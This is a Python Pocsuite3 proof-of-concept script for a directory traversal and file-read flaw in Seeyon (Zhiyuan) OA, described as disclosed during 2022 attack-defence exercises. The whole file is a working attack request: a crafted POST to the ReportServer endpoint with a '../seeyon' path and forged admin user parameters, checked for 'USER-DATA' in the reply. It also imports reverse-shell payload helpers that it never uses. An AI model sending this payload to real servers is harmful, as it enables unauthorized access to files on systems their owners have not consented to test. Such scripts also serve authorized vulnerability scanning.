from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import base64
class DemoPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '致远OA目录遍历'
    appName = '致远OA'
    appVersion = 'All'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''2022攻防演习期间，致远OA被曝存在任意文件读取漏洞。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):#验证模式
        result = {}
        target = self.url+"/seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../seeyon&currentUserName=admin&currentUserId=1&isWebReport=true"
        try:
            r = requests.post(url=target,timeout=8,verify=False)
            if r.status_code == 200 and "USER-DATA" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                result['verifyInfo']['Path'] = self.url+"/seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../seeyon&currentUserName=admin&currentUserId=1&isWebReport=true"
                return self.parse_output(result)
        except:
            pass

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)